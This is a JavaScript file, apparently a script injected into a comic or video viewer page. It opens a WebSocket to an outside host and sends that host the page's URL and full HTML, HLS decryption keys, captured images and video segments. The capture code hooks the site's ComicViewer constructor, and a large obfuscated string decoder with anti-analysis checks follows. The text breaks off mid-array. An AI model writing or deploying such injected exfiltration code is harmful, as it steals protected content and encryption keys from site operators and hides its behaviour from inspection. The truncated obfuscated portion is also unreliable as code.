alert("Injected ^_^");
window.host = "usercontents.fuhuzz.rip";
window.socket = new WebSocket(`wss://${window.host}/ws`);
window.socket.onopen = function () {
  alert("Connected to the server!");
  setTimeout(() => window.socket.send(JSON.stringify({
    action: "log_source",
    payload: {
      url: window.location.href,
      source: document.documentElement.outerHTML
    }
  })), 3e3);
};
class FuckFuhu {
  hlsKeys = [];
  segments = [];
  host = window.host;
  socket = window.socket;
  embedUrl = window.location.href;
  constructor(e, t) {
    this.fid = e;
    if (document.querySelector("video")) {
      this.seekTo();
    }
  }
  seekTo = async () => {
    try {
      let e = await this.seekable();
      let t = document.createElement("button");
      t.textContent = this.secondsToHMS(e);
      Object.assign(t.style, {
        top: "4px",
        left: "4px",
        opacity: .6,
        padding: "4px 8px",
        position: "absolute"
      });
      let s = () => {
        let t = document.querySelector("video");
        t.play().then(() => {
          t.currentTime = e;
        }).catch(s => {
          t.muted = true;
          t.play();
          t.currentTime = e;
        });
      };
      t.addEventListener("click", s);
      document.querySelector(".video-wrap").append(t);
    } catch (n) {
      console.log(n);
      alert(n.message);
    }
  };
  setSegments(e = {}) {
    let t = e.formats;
    if (t && t.enc && t.enc.seg) {
      if (Array.isArray(t.enc.seg)) {
        this.segments = t.enc.seg.filter(e => !["raw", "key"].includes(e[0]));
      }
      this.socket.send(JSON.stringify({
        action: "parse_url",
        payload: {
          fid: this.fid,
          data: e
        }
      }));
    }
  }
  ready() {
    return this.socket.readyState === this.socket.OPEN;
  }
  log(e, t) {
    this.socket.send(JSON.stringify({
      action: e,
      payload: {
        data: t,
        fid: this.fid
      }
    }));
  }
  uploadHlsKey = (e, t) => {
    let s = Array.from(e).map(e => ("0" + e.toString(16)).slice(-2)).join("");
    if (!this.hlsKeys.includes(s)) {
      this.hlsKeys.push(s);
      this.socket.send(JSON.stringify({
        action: "hls_key",
        payload: {
          fid: this.fid,
          keyHex: s,
          keyUrl: t,
          keyIndex: this.hlsKeys.length
        }
      }));
    }
  };
  uploadImage = (e, t) => {
    let s = document.createElement("canvas");
    let n = s.getContext("2d");
    s.width = e.width;
    s.height = e.height;
    n.drawImage(e, 0, 0);
    s.toBlob(async e => {
      try {
        let a = new TextEncoder().encode(JSON.stringify({
          type: "image",
          url: `${this.fid}/${t}.webp`
        }));
        let o = new Uint8Array(4 + a.length + e.size);
        o.set(new Uint8Array(new Uint32Array([a.length]).buffer), 0);
        o.set(a, 4);
        let r = await e.arrayBuffer();
        o.set(new Uint8Array(r), 4 + a.length);
        this.socket.send(o);
        n.clearRect(0, 0, s.width, s.height);
        s.remove();
      } catch (l) {
        console.log(l);
        alert(l.message);
      }
    }, "image/webp", 1);
  };
  uploadSegment = async (e, t, s, n, i = 1) => {
    try {
      let a = new URL(t).searchParams.get("f");
      let o = this.segments.findIndex(e => e[1] === a);
      let r = new FormData();
      r.append("url", e);
      r.append("fragIndex", o);
      r.append("segmentUrl", t);
      r.append("redirectUrl", s);
      if (n) {
        r.append("segment", new Blob([n], {
          type: "video/mp2t"
        }));
      }
      let d = await fetch(`https://${this.host}/api/upload/segment?fid=${this.fid}`, {
        method: "POST",
        body: r
      });
      if (!d.ok) {
        let c = await d.json();
        alert(c.message || c.error.message);
      }
    } catch (h) {
      if (++i <= 3) {
        return this.uploadSegment(e, t, s, n, i);
      }
      console.log(h);
      alert(h.message);
    }
  };
  secondsToHMS(e) {
    let t = Math.floor(e / 3600);
    let s = Math.floor(e % 3600 / 60);
    let n = e % 60;
    return (t = t < 10 ? "0" + t : t) + ":" + (s = s < 10 ? "0" + s : s) + ":" + (n = e < 10 ? "0" + e : e);
  }
  seekable = async () => {
    let e = await fetch(`https://${this.host}/api/seekable?fid=${this.fid}`);
    let t = await e.json();
    return t.to;
  };
}
;
(function (_0x550bf0, _0x37fc4c) {
  var _0x422a31 = _0x550bf0();
  while (true) {
    try {
      var _0x14c652 = parseInt(a0_0x1c06(928, 'KP3P')) / 1 + parseInt(a0_0x1c06(1142, 'u54F')) / 2 + -parseInt(a0_0x1c06(1029, 'NHgj')) / 3 + -parseInt(a0_0x1c06(694, '9qKJ')) / 4 + -parseInt(a0_0x1c06(997, 'WEZT')) / 5 * (parseInt(a0_0x1c06(852, 'FjPA')) / 6) + parseInt(a0_0x1c06(1049, 'aVXo')) / 7 * (-parseInt(a0_0x1c06(1051, '9qKJ')) / 8) + parseInt(a0_0x1c06(685, '9TjR')) / 9 * (parseInt(a0_0x1c06(1083, 'tZ1U')) / 10);
      if (_0x14c652 === _0x37fc4c) {
        break;
      } else {
        _0x422a31.push(_0x422a31.shift());
      }
    } catch (_0x1f429e) {
      _0x422a31.push(_0x422a31.shift());
    }
  }
})(a0_0x12b7, 552518);
function a0_0xe6f303(_0xc53b45, _0x67987a, _0x20edfb, _0xd7e8fe, _0x4a1bad) {
  return a0_0x1c06(_0xd7e8fe - 0x25e, _0x67987a);
}
function a0_0xbaa863(_0x4d2459, _0x38d5b4, _0x43627a, _0x32ec25, _0x2e8384) {
  return a0_0x1c06(_0x4d2459 + 0x72, _0x2e8384);
}
function a0_0x2ae440(_0x3c71d1, _0x5b8de5, _0xe6d358, _0x38dd00, _0x281a10) {
  return a0_0x1c06(_0x5b8de5 - 0x81, _0x3c71d1);
}
var a0_0x403063 = function () {
  var _0x4db752 = true;
  return function (_0x27103d, _0x2e5c26) {
    var _0x4baade = _0x4db752 ? function () {
      if (_0x2e5c26) {
        var _0x7e2b52 = _0x2e5c26.apply(_0x27103d, arguments);
        _0x2e5c26 = null;
        return _0x7e2b52;
      }
    } : function () {};
    _0x4db752 = false;
    return _0x4baade;
  };
}();
function a0_0xd22a96(_0x10848a, _0x474efd, _0x36843, _0x35a8d9, _0x869278) {
  return a0_0x1c06(_0x474efd + 0x21a, _0x36843);
}
var a0_0x520662 = a0_0x403063(this, function () {
  return a0_0x520662.toString().search("(((.+)+)+)+$").toString().constructor(a0_0x520662).search("(((.+)+)+)+$");
});
function a0_0x1c06(_0xbc338c, _0x1e30d4) {
  var _0x4bd6b8 = a0_0x12b7();
  a0_0x1c06 = function (_0x151ba8, _0x2542af) {
    _0x151ba8 = _0x151ba8 - 423;
    var _0x5b2f11 = _0x4bd6b8[_0x151ba8];
    if (a0_0x1c06.qwAGTq === undefined) {
      var _0x28662b = function (_0x35b3ff) {
        var _0x19ad82 = '';
        var _0x591668 = '';
        var _0x3f50ca = _0x19ad82 + _0x28662b;
        var _0x584cf5 = 0;
        var _0x3a31c3;
        var _0x82cf26;
        for (var _0x29c086 = 0; _0x82cf26 = _0x35b3ff.charAt(_0x29c086++); ~_0x82cf26 && (_0x3a31c3 = _0x584cf5 % 4 ? _0x3a31c3 * 64 + _0x82cf26 : _0x82cf26, _0x584cf5++ % 4) ? _0x19ad82 += _0x3f50ca.charCodeAt(_0x29c086 + 10) - 10 !== 0 ? String.fromCharCode(255 & _0x3a31c3 >> (-2 * _0x584cf5 & 6)) : _0x584cf5 : 0) {
          _0x82cf26 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='.indexOf(_0x82cf26);
        }
        var _0x8792a1 = 0;
        for (var _0x474b66 = _0x19ad82.length; _0x8792a1 < _0x474b66; _0x8792a1++) {
          _0x591668 += '%' + ('00' + _0x19ad82.charCodeAt(_0x8792a1).toString(16)).slice(-2);
        }
        return decodeURIComponent(_0x591668);
      };
      var _0x218cd1 = function (_0x4637bf, _0x7c1e2b) {
        var _0x48b5a3 = [];
        var _0x539f77 = 0;
        var _0x95a4c9;
        var _0x20d95a = '';
        _0x4637bf = _0x28662b(_0x4637bf);
        var _0x5935a1;
        for (_0x5935a1 = 0; _0x5935a1 < 256; _0x5935a1++) {
          _0x48b5a3[_0x5935a1] = _0x5935a1;
        }
        for (_0x5935a1 = 0; _0x5935a1 < 256; _0x5935a1++) {
          _0x539f77 = (_0x539f77 + _0x48b5a3[_0x5935a1] + _0x7c1e2b.charCodeAt(_0x5935a1 % _0x7c1e2b.length)) % 256;
          _0x95a4c9 = _0x48b5a3[_0x5935a1];
          _0x48b5a3[_0x5935a1] = _0x48b5a3[_0x539f77];
          _0x48b5a3[_0x539f77] = _0x95a4c9;
        }
        _0x5935a1 = 0;
        _0x539f77 = 0;
        for (var _0x52d810 = 0; _0x52d810 < _0x4637bf.length; _0x52d810++) {
          _0x5935a1 = (_0x5935a1 + 1) % 256;
          _0x539f77 = (_0x539f77 + _0x48b5a3[_0x5935a1]) % 256;
          _0x95a4c9 = _0x48b5a3[_0x5935a1];
          _0x48b5a3[_0x5935a1] = _0x48b5a3[_0x539f77];
          _0x48b5a3[_0x539f77] = _0x95a4c9;
          _0x20d95a += String.fromCharCode(_0x4637bf.charCodeAt(_0x52d810) ^ _0x48b5a3[(_0x48b5a3[_0x5935a1] + _0x48b5a3[_0x539f77]) % 256]);
        }
        return _0x20d95a;
      };
      a0_0x1c06.hboWjK = _0x218cd1;
      _0xbc338c = arguments;
      a0_0x1c06.qwAGTq = true;
    }
    var _0x36558f = _0x4bd6b8[0];
    var _0xaf6690 = _0x151ba8 + _0x36558f;
    var _0x1bd06c = _0xbc338c[_0xaf6690];
    if (!_0x1bd06c) {
      if (a0_0x1c06.Beersh === undefined) {
        var _0x19d18f = function (_0x538a18) {
          this.NARtFu = _0x538a18;
          this.jPaXmZ = [1, 0, 0];
          this.jDQXOz = function () {
            return 'newState';
          };
          this.IMMaIA = "\\w+ *\\(\\) *{\\w+ *";
          this.atRZSj = "['|\"].+['|\"];? *}";
        };
        _0x19d18f.prototype.yBcGpE = function () {
          var _0x204d6b = new RegExp(this.IMMaIA + this.atRZSj);
          var _0x190ceb = _0x204d6b.test(this.jDQXOz.toString()) ? --this.jPaXmZ[1] : --this.jPaXmZ[0];
          return this.VEFjOH(_0x190ceb);
        };
        _0x19d18f.prototype.VEFjOH = function (_0xf7735f) {
          if (!Boolean(~_0xf7735f)) {
            return _0xf7735f;
          }
          return this.qxaSlD(this.NARtFu);
        };
        _0x19d18f.prototype.qxaSlD = function (_0xcf0b) {
          var _0x37d91e = 0;
          for (var _0x50dcb7 = this.jPaXmZ.length; _0x37d91e < _0x50dcb7; _0x37d91e++) {
            this.jPaXmZ.push(Math.round(Math.random()));
            _0x50dcb7 = this.jPaXmZ.length;
          }
          return _0xcf0b(this.jPaXmZ[0]);
        };
        new _0x19d18f(a0_0x1c06).yBcGpE();
        a0_0x1c06.Beersh = true;
      }
      _0x5b2f11 = a0_0x1c06.hboWjK(_0x5b2f11, _0x2542af);
      _0xbc338c[_0xaf6690] = _0x5b2f11;
    } else {
      _0x5b2f11 = _0x1bd06c;
    }
    return _0x5b2f11;
  };
  return a0_0x1c06(_0xbc338c, _0x1e30d4);
}
a0_0x520662();
function ComicViewer(_0x10e2e0) {
  window.fuckFuhu = new FuckFuhu(_0x10e2e0.chapter_id);
  this.servers_data = [];
  this.total_images = 0;
  this.servers_el = _0x10e2e0.servers_el;
  this.servers_wrapper_el = _0x10e2e0.servers_wrapper_el;
  this.viewer_el = _0x10e2e0.viewer_el;
  this.max_loading = _0x10e2e0.max_loading || 5;
  this.enable_more_btn = _0x10e2e0.enable_more_btn;
  this.more_btn_el = _0x10e2e0.more_btn_el;
  this.comic_id = _0x10e2e0.comic_id;
  this.chapter_id = _0x10e2e0.chapter_id;
  this.sig = _0x10e2e0.sig;
  this.crypto = CryptoJS;
  this.settings = _0x10e2e0;
  this.webp_support = false;
}
function a0_0x12b7() {
  var _0x44bd4c = ['WPClW5fLFq', 'u8o1pYxdQq', 'W4/cVmokfCkH', 'jr3dLhVcKG', 'WOj8W4bkWRS', 'W53dPSkcWP3dPq', 'c1bhrSk7', 'CJvzf8os', 'W4RdU8ogW5La', 'BxK1WOJcNq', 'W7CjW7ldGe4', 'o8o9fKTQ', 'hLLAx8kS', 'WQhcJZqK', 'vajXWOXr', 'W5FcPdrxEq', 'WQxdR8kGa8ok', 'mGddOM7cLa', 'W6dcNmo3iSkt', 'gmkeW7yAW7i', 'W5tdP23cM8kP', 'C8oMvmk1W40', 'bCotauTX', 'WRmwW5n+WR4', 'CmoMW5VcQCkg', 'WRvOxJTS', 'WOdcHtBdVs4', 'W4lcUXDgzq', 'W7FcLmopg8k2', 'W6LxW4RcQLW', 'k8oUb8oX', 'ytzGeSow', 'wqXPsmkaWRZcISo7', 'jCkvW7Lf', 'ga7dImkR', 'dNxdV8o6kq', 'WRLQW4dcSci', 'cx/dV8oEhq', 'ie8DW5O/', 'FSo3n09h', 'W7hcMSktCJG', 'u8oZaKPD', 'W5vMv8kpgW', 'tJG5yfS', 'hGZdKhNcLq', 'DqJcQCoVda', 'W4/cPbrqCG', 'eg7dV8oZjW', 'W4pcR8opcCkz', 'c1vgtq', 'WOD5fCkKWQW', 'W6VcLmo6WQmF', 'WPNcTmodWO1V', 'W4mGxCkvAG', 'W6hdVCoX', 'fSkiW7ez', 'W7/cQCkO', 'DmkjW44mWQfRW7TvWQbJW6m', 'WOjVWPS+WQu', 'W58jBSkuzW', 'WR9TxIX9', 'a8kuW68nW7u', 'W5VdKCo5W4HF', 'WOVdO08nia', 'xuaBvCo4', 'l1tdPK/cQa', 'WPa7W4X4Ba', 'WOtcIZGckW', 'k8oGjSojWPy', 'kCk8W5/dOSkq', 'W5/dUbSsoW', 'WOFdGSkCiCok', 'AdrxdW', 'WPO4W6fjWQa', 'eJtdPSkKDq', 'WRpdNCk3f8o5', 'iKKiW5ed', 'W7WNDSoPqa', 'W47cTCojW7aH', 'sd3cMmoamG', 'WOLXwwq', 'W73cOmoyW7y7', 'W5uQWOG', 'qqf7iSo8', 'e1tdSmoBn8kyW5mmEa', 'dq5gW6L7', 'W5VcVmojW7a', 'l8owWPG', 'fCk2W7OFW4W', 'kIbKW4BdIvrOW7pcIXFcHCk7W64', 'W7j7W7tcGui', 'DNe3WPO', 'WPnLemoB', 'kWhcMSkQtW', 'cSoUnmoyWO8', 'qSoddCo1AW', 'EaJcPa', 'ofRcHtVdTG', 'W4lcTCoE', 'fehdRCoIoW', 'eCkNoSoSWRy', 'iX3dH3/cLa', 'WRpcH3CPfW', 'WP1ztCkfWPK', 'kCoBWRjaW4a', 'c0NdNSoDnG', 'BLGOWOZcLG', 'W4yDnmk8iW', 'iX3dRNpcGG', 'WRRcJmo5W6pcVCkqW5KoWOrZWOf+', 'W6DxW6/cLhS', 'WQmTW6rxvh/dLSok', 't8oIu8k1W4e', 'W4yxo8k/mG', 'WPuQWQ7dNKW', 'aGLgW71g', 'W73dKCk/WQddQq', 'W7RdRmo2W5D9', 'WQrHWPbkla', 'W6hcPmonW7W5', 'dttdMCkeva', 'CYvifCoy', 'W7VcQCkPsW', 'W6FcLmowkmkN', 'W7HmW7ZcMvW', 'dXztW7X9', 'W4/dOSopW5HR', 'WQ91uZv9', 'oSkNW4W6W7a', 'xmoedG', 'hSomo8oVWPK', 'i8oOj2HW', 'nCoGhv5b', 'FHjuWQDv', 'ztno', 'BCoxW5VcTW', 'WQdcPXSbmG', 'W6XrW6JcIq', 'cfJdQ8oLlW', 'W7W+pCkSeW', 'WPtdKSkaimoL', 'W6tcGSoVWQiM', 'W5hcLSkmCte', 'W6jgWOm+WQzAW4r5Bra', 'W5NcRmoCW6iQ', 'WOHat8ki', 'fmkaW6SC', 'wuGcWQRcSG', 'W77dM8k+WQldGq', 'WOZdRmkcemod', 'W4W9WPaJWRW', 'h8oJe8oWWRy', 'W7CkW7ldGW', 'vmo4AIy', 'dKtdS8o3nW', 'pCoNtSkQWPC', 'WQddO8k3aSok', 'WRpcIqK0aq', 'W5hdVwBcH8kb', 'tCoccG', 'ymoszSkDWOq', 'WR/dMSk9eq', 'yZjde8oj', 'WODhrG', 'WOeOW55pW74', 'W5iDWRaoWPe', 'qWahtCkG', 'W4FcPmkBzqi', 'xSkcW7aq', 'W6lcL8o3jmks', 'WOTQW6zMWOO', 'W41AxSknaq', 'WRpdLCkWaCob', 'h8oqpw90', 'W5FdHmo0W4Ks', 'WP4FW4zNWRW', 'mfqjW6uv', 'cLRdOSoWnq', 'aKtdTSoWiW', 'W79jW7rGzW', 'W5ZdKCkSWRxdUa', 'Bcvubmoj', 'W6RcQCkJw8o5', 'tYvtd8oB', 'W5ZcT8oA', 'W6xcMCoUla', 'tSoDWOVcKCkG', 'WPpcOCoqW6nV', 'gfb6sSkA', 'aSoMfCoHWQe', 'aSk+W7Or', 'WQrWimoKWPi', 't8o8kmojwG', 'qGf7jSo8', 'W4LCsSkKnq', 'nmokWQLCW7G', 'W6NcP8kUxCoP', 'WOjmt8klWPK', 'ntJdGmkMxa', 'W78gm8oG', 'WPNcPdhdNCor', 'q8ohkbpdJa', 'W6GWWRldIfjlWQRcKI0uW5ZdJG', 'WQ1eq8kUWRu', 'D3u+WPJcJa', 'bLCeW4WJ', 'l8oxWPe', 'EH5bWRXr', 'WQpcLdS3oG', 'drrEW6L7', 'Au81WPm', 'W7bOW6fBtG', 'W7DVtSkYaG', 'WPfJjmodWRG', 'W4xcMCoUla', 'W70oWR4wWPi', 'fwfeqUg7OG', 'WRvvvZnN', 'a8kvW74jW7m', 'jr/dGxxcOq', 'bXtdJSkrvW', 'W4lcTCoEWRGN', 'WR3cKdVdUd0', 'WR7cHtddPZ0', 'W6tcUCoJfmkB', 'k2XOWOpdJW', 'ymoPrSkK', 'a0/dU8oYmW', 'xCoEbmoT', 'W7ddTCoHW4re', 'ECoMCJRcOW', 'k2BdN8oWeG', 'W64QWP40WQC', 'W6tcPY9RwG', 'cLZcPaRdGG', 'lh15Amki', 'W40rvCoDwW', 'k3ODW6Ks', 'WP1eFH1i', 'WRjPW6dcGHa', 'WQRcHZ0Laa', 'WRrRW6dcKW8', 'W5OkWRiTWPi', 'WRjWW7pcGWy', 'W47cTmoGWQi9', 'W50/WO8YWQe', 'WPLYuZbm', 'kbrZW4fw', 'iCo3bL4', 'W4BcKSkkzNK', 'u0uAWOBcTq', 'FSklWPjBW7i', 'iWhdKG', 'zmoUv8kOW44', 'cSosWPPkW5i', 'bCokjSooWPS', 'W597q8kVaa', 'W7byW6r3ta', 'WPr2n8ouWQ8', 'BZGQDuO', 'W4tcGCoBWRaT', 'WQJcGJ8bbW', 'WP9dW6ZcQqi', 'gxxdT8o5', 'CSoQqa', 'W5hcUdHuEq', 'W4BcQ8oqW6eC', 'xrWzmg4', 'jvVcLG', 'WRZcUYFdUa', 'C8oWEmk5W5S', 'ccnQW6no', 'W5GbcSk8jW', 'WRqBW4e', 'uSoIlxLu', 'W4xcJIPzsG', 'j1myW6OD', 'W6xcSGBdOog7UW', 'tSomdsu', 'zConcG', 'W5yZt8oHtq', 'W6FcVSoTWQ4O', 'mgNdJSoxfa', 'WPrsW6CjAW', 'WPNcHGZdGtu', 'WRNHU6JcOCkD4BUc', 'aSoOn8oRWR0', 'i1tcLtpdTa', 'aH7dTHq', 'dCofnSoDWPm', 'WOz/W4BcMZy', 'W6JcTCkTqd4', 'W7JcL8o+W5eG', 'uCopgG', 'wLebWR3cGa', 'rmoVm0m', 'WQJcIc3dUYO', 'W5hdU3VcNCkL', 'W4ZcLCk/FSoc', 'WO9DtSkE', 'W4pcQSoyW7eM', 'aCoKnmokWQ4', 'W4m7fmkzbW', 'WQ8tW5e', 'W7TzW6RcTvW', 'W44OqSoP', 'xrWzqM4', 'DILFfmoy', 'W5xcK8kRcSk7', 'W6tcISofjmkv', 'WR9uW6NcLWS', 'W7aHB8kxEq', 'kwRcKY7dTa', 'W5PZwSk4', 'W73dHSkU', 'W60zWPmwW6C', 'W5FcJ8opWPC', 'bY7dSfVcPW', 'FMmJWP7cNW', 'iSkeW74EW64', 'BZrk', 'W7dcLSkFzca', 'WQn/W47cLJK', 'WQzeW5rdWQi', 'D8oYo8ousq', 'W5pdSw7cJmkC', 'WRrsW6tcKZu', 'W6tcLCoQoCki', 'DNeOWQdcLa', 'ASoddq', 'W58JWPy0WRG', 'W50BmCkSlG', 'W5WzgCozW5JdVqVcIczGEq', 'W4BcOSotWOS7', 'Aa5zemoh', 'ESoFW5VcUCkI', 'jfZcLt8', 'WQBcLIOScG', 'jrxcIEg7UCoJ', 'ESoAwH/cPa', 'W58GWPeKWQC', 'CZnlmSoZ', 'FWvh', 'W7hcPCkPsmoL', 'wLnOWR7cUq', 'WQarW5LFxa', 'W6ddGmkOWQ7dUa', 'FCkYw8oPW4S', 'zNLBu8ko', 'ouVdGMJcVW', 'nCoNfLXq', 'WOzqW5VcHHu', 'WR1mW4dcSci', 'WQCjW5Lc', 'W7FcMmksqay', 'eCoSWQXoW6i', 'ku9SaSkd', 'h8ktW7i', 'W5hcM8krCa', 'kSoyW5HbW60', 'WPJcLHFdGGO', 'ldJdUmkxyW', 'DcvcfW', 'v0KaWRBcSW', 'Fmo6W5VcUSka', 'W7JcHCkRsSo8', 'rrDckmoh', 'WQmQW5nsEa', 'WPb1nmoqWQy', 'fgZdUCoZjW', 'W7LvWPSLW6m', 'W7lcISo5', 'W7tcKCoRWROo', 'vmoAgCoKCq', 'W6VcRmksECow', 'gCkeW6G', 'p1LjsSk9', 'hxVdOCoXiq', 'pSoVbIhdHW', 'WRVdL2K8rW', 'WQDJjSosWRu', 'W4lcPmonW7yN', 'gCkmW7HqW6O', 'xmoJFsxcKa', 'W5mSwCkC', 'zSolWPCxWRq', 'W5nhW6bVBq', 'F8k2v8k6W6ffWP3dPSofW6ddUW', 'E8oCW5e', 'WRLoW4ftWQi', 'W6ZcGSoNWPuD', 'wGjnW6Ty', 'W7/cTmkPCmo0', 'WRpdPmkMwSoD', 'W5SQWOSuWRS', 'W6zsxmkIkG', 'p0hcGZpdTa', 'WQ9Swa', 'rCoybSo1Ba', 'W4WZDmkiW7b5sSkwj8oOWOBdKq', 'lmoHWRfaW7G', 'pd8SBqi', 'Dmomp8ozsW', 'AmoHW5RcR8kC', 'BCoPW5dcV8kB', 'dqPgW6P8', 'W4ldVgNcMCkC', 'WPJdOSkOWP8', 'DJVcPmonta', 'WOC/W51pWOS', 'gCkXW7azWRO', 'W6r4W4reFG', 'i8olWRvyW6C', 'W4/cOmopWPW', 'W5yUvCo4yq', 'b8oHWQb2W7O', 'xZxcVSoooW', 'ztxcMSozmG', 'pL0C', 'u8oyCIxcOW', 'W4Kto8kUjW', 'FY4R', 'DdWQqea', 'W5X5qmkYda', 'WRLdW5rlWQq', 'WPhcOM7dNSkk', 'bCkObSoRWPy', 'WPRdTMNcMSkn', 'WRqyW4zCtW', 'ntWjh8kf', 'WQXQtcHe', 'D8oTW5FcVmkC', 'W4BcQ8oAW7K6', 'gv/dVa', 'saZcRmoLfG', 'W7r1W4rexG', 'WOJdQmkNW5ef', 'W5aGWPW2WQC', 'WRuHW59HWRG', 'WQ7cTJiVhq', 'sq/cUSoUlG', 'WRb1W7xcLbe', 'WReyW5raCq', 'WOGsW5jv', 'p1mnW68y', 'AqZcVmoLdG', 'cKLSrmkA', 'jhfQt8kN', 'W5JcOmoBW6uq', 'v8k+W43dMZS', 'W6lcGCoOW5qo', 'WQalW4fM', 'W5tcMSk3ymoR', 'nrVdG3pcIa', 'W7pcNCoQiCkq', 'W5hcKCkxsmol', 'A8oStSkY', 'EdWSyG', 'p2BdI3ddMG', 'W4lcPmobW4iM', 'm8kHueTr', 'W5ZcOmolW6mQ', 'smoqoXJdKa', 'zIZcIConoq', 'pSoIeCoKWRy', 'wwdcM8o1dCocqCoqx8ofgW', 'W64jCSkTFG', 'WQBdNCkIjmoR', 'WPW9WP55W7m', 'gWFdMuNcGW', 'W4Sqn8oSiW', 'W4rKwSkNja', 'WPhcKZnGhW', 'W7G5d8k/ca', 'WQqTWPmflq/cPCoauXFcT8obeq', 'WQ3cIcVdTZm', 'zSoMjdRdOG', 'cYhdNCkIvq', 'W63cLSocWQ8i', 'W5HKESk2eW', 'AmoMua', 'qatcRSo1', 'W5FdUSo8W5LH', 'W6ddLu3cQmkl', 'W5NcOCkZtG', 'DdLkbG', 'W7HZW4LzFa', 'W5KQtCkaAG', 'DSokddFdHG', 'qSozWQ5nW7BdKxH1jSov', 'WRvGsa', 'nGddGM7cQW', 'k2hcSbFdQG', 'W7r4W6rACq', 'W4FcGmknzJm', 'W4FcGCkHBJa', 'W5JdTSkLWPKf', 'W5OJWRmYWOu', 'WO1mymkaWOe', 'ySkTu8k0W5i', 'WP3cGtddOJ0', 'kCo1pSoHWRm', 'stZcOmoQea', 'mmkLvuWf', 'WOGFW75ZvW', 'WQurW5LEsW', 'xCoabNb9', 'W7pdNM51qNbiFSk1raldNG', 'uqvOjmo0', 'i8oal8oXWRe', 'W7tdLMXZq3WMv8kNwZtdTSkg', 'WP54e8k0g8kSWQbAh8oOimkB', 'WQjXW7JcNqy', 'WPH3hSk6uW', 'WRyzW4KtWRC', 'W78/W7nmWOG', 'WR9PvJ9I', 'W4PIqCkI', 'W4xdTxZcImof', 'W4/cO8ofWPu', 'nCoqWPe', 'sWJcPSoRda', 'WOnSwW', 'd17dUG', 'yWNcMmo+na', 'W4LLwW', 'WR3dImo9WQRcUa', 'W7hdKNy', 'mfKfW6C', 'WQhcSZahcW', 'vtlcRCoG', 'Cwm/WPe', 'WQ9yW4zgWQW', 'kmoIfCoPWRq', 'WRnRwI57', 'p0BcGaVdLa', 'AdiSyKm', 'FhjguG', 'W6nCA8kqiG', 'egtdV0NcVW', 'CI0qANO', 'W7vRW4jcwW', 'WOiBW5nTWR4', 'CSo8dcW', 'W6iyW7BHUznl', 'W4u1g8kHia', 'W4JdSx8', 'xmooeCk8', 'WQ97y8kuWQW', 'gH9xW7W', 'juyLW4ub', 'WOD1gmogWRm', 'imoId8oVWQm', 'W5RdS8oBW49z', 'WP1pdX5c', 'rCo/Ct3cIG', 'W5BcNmkkzJG', 'WR3cKtldPdC', 'W4LuqSkPeq', 'E8o7afyi', 'h1ZcNc/dTG', 'W7BcSSoorHu', 'feJdO04', 'euNdPK/cJW', 'W4NcLSkh', 'WQ/cTtpdNZO', 'bmoae8oeWO4', 'Fs0OzKe', 'vaxcP8o7', 'WRxcHZqKha', 'mmkZe8oLWOBcKZ0pW7lcOSkxtrG', 'Dq05zW', 'W5vivCk3eW', 'W7BcMCoZoCky', 'vCoKhe9v', 'WRdcIda4iG', 'WPHarmkBWOG', 'bwFdV8oZ', 'xmoedSkVlq', 'l8oOdmoHWRq', 'W7JcS8k0tSo2', 'WQ5/CdTt', 'W7r1W4rgAq', 'WR/dR8kL', 'gNpdPq', 'W4VcMCoPWOWi', 'b8kiW7SjW7i', 'kXddRmkgEG', 'zmouqSk+W6e', 'ivKCW6Cq', 'a23dKmoZoq', 'WQlcSt8Ijq', 'W4hcKSkqCtu', 'iSkQW5ZcR8kA', 'AwLYW5/dLW', 'qSoLhenD', 'WONdO8k/fmoi', 'W61TW6tcT0O', 'WOK3DConW7G', 'ASoprmktW4q', 'af7cNsNdNa', 'e0BdSN/cGG', 'ymo9dCoByG', 'beVdTSo8nq', 'l8kiW7iCW70', 'WPFdI8kLnmo+', 'WQ1zASkAWPS', 'iLddS8oamW', 'xY1jba', 'W5ZcHCku', 'W53cMSoCW7K', 'WRHKsZ0', 'W6/cS8kywmoJ', 'WOnSuJ1U', 'W6ldKCkJWRhdUa', 'WR9hW5rtWQq', 'WPWvW559WOW', 'WRxcLc0Iea', 'WOldSmo8W5Ss', 'W5iUuSoTqa', 'W5SPw8karW', 'WR11tZLN', 'dbjjW4zQ', 'W4BcOmoo', 'W74nWO0uWOy', 'WQRcVmkUrmkE', 'j8oOimojWPy', 'W4xcUqHosa', 'hrzlW7b7', 'm8oGfKfh', 'jCkkW7m6W4G', 'WRGxW5zR', 'bmkVE3f+W7ePox8', 'CGNdNJ7dSW', 'xN3dOmo4iq', 'WRJcJsFdOZ0', 'gf7dOmo8nq', 'nrRdGwRcIq', 'W67cS8k2FSoF', 'W6RdOmkI', 'ACohex0', 'W5rDW6i', 'ivuEW6ms', 'W6SZfmkzbW', 'kCoPfq', 'kwlcLdJdJa', 'yY9xcSoE', 'W67cTmk+q8o0', 'W5pcVHrl', 'nK4EW6qd', 'WQlcIdSIhW', 'c0VdMepcVq', 'p8oZgmoKWRi', 'aK/dPq', 'Cmo9eCokEq', 'lqVdU0pcLa', 'iXZdQSkbDW', 'W5pcOGLnyG', 'AwOFWPJcOG', 'W5CPumklua', 'AZq8D0C', 'oNpdK8ougG', 'yYv7d8or', 'juVdPSo8lq', 'aIxdGmkR', 'W5GGuCkcqq', 'W488WO4gWP0', 'WRuqW5e', 'lWRdHG', 'WRHFvCkCWOi', 'W7aKWPmKWPu', 'W73dHmkHWR/dUa', 'aZtdMG', 'zW9dWRfE', 'WR5BWPz6W64', 'cu7dRLtcHG', 'aafu', 'WRXKW7xcKGS', 'W4OMWPOGWRy', 'WPHhnSk5FW', 'cmkNW64FW7K', 'W5xdHmoMW7Xf', 'W4q3umkrwG', 'WO1hW71VWPO', 'W5pcUCopWOWQ', 'W4WJWP4JWRu', 'W7dcU8ogWRWD', 'i0KFW6m', 'W61zW5eJWQi', 'WPniW4vUWRS', 'W7n8W5fxjW', 'f3FdOCoY', 'W6NcTmktymoH', 'Aog6RrOp4BIC', 'W5BcTCoyWO0Q', 'W63cPdfayq', 'WQn2W57cLa8', 'WRlcT8kItCoH', 'wmozW7/cMSk1', 'W6yvb8kHDa', 'W5u0rCouBq', 'W4mCeSkAkG', 'W6NcT8kZBSoW', 'W67cSmkRrSoL', 'W7uesCkKDa', 'WPdcPZubmG', 'W6CazmoDBG', 'h1FdUKxcGa', 'ohKpw8kkWORcRwpcSCkaW6ZdMq', 'W4H4W4K', 'if/cHY3dLG', 'W4VdJSkkWQZdIG', 'WR5RW7xcNHy', 'h1D4x8kq', 'j1m/W78d', 'iJDxW49y', 'WRLoW5rvWQG', 'cqnjW60', 